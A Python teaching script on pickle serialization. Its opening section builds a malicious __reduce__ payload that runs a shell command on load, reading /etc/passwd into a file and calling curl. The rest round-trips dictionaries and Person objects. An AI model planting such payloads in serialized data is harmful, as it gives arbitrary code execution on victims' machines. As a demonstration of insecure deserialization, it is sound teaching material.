# Serializing and deserializing
##

import os
import pickle
# I want to customize how to pickle the object
class Exploit():
    def __reduce__(self):
        return (os.system,("cat /etc/passwd > exploit.txt && curl www.google.com >> exploit.txt",))
##
def serialize_exploit(fname):
    with open(fname, 'wb') as f:
        pickle.dump(Exploit(), f)

serialize_exploit('loadme')
pickle.load(open('loadme', 'rb'))
##
# -----------------------------------------------------------------------------
d1 = {'a': 1, 'b': 2}
d2 = {'x': 10, 'y': d1}
d1_ser = pickle.dumps(d1)
d2_ser = pickle.dumps(d2)

# simulate exiting the program, or maybe just restarting the notebook
del d1
del d2

# load the data back up
d1 = pickle.loads(d1_ser)
d2 = pickle.loads(d2_ser)

# and continue processing as before
print(d1)
print(d2)
d1['c'] = 3
print(d1)
print(d2)

##
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age

    def __eq__(self, other):
        return self.name == other.name and self.age == other.age

    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'

john = Person('John Cleese', 79)
eric = Person('Eric Idle', 75)
michael = Person('Michael Palin', 75)

parrot_sketch = {
    "title": "Parrot Sketch",
    "actors": [john, michael]
}

ministry_sketch = {
    "title": "Ministry of Silly Walks",
    "actors": [john, michael]
}

joke_sketch = {
    "title": "Funniest Joke in the World",
    "actors": [eric, michael]
}

fan_favorites = {
    "user_1": [parrot_sketch, joke_sketch],
    "user_2": [parrot_sketch, ministry_sketch]
}

from pprint import pprint
pprint(fan_favorites)
ser = pickle.dumps(fan_favorites)
ser
new_fan_favorites = pickle.loads(ser)
pprint(new_fan_favorites)

fan_favorites == new_fan_favorites
fan_favorites is new_fan_favorites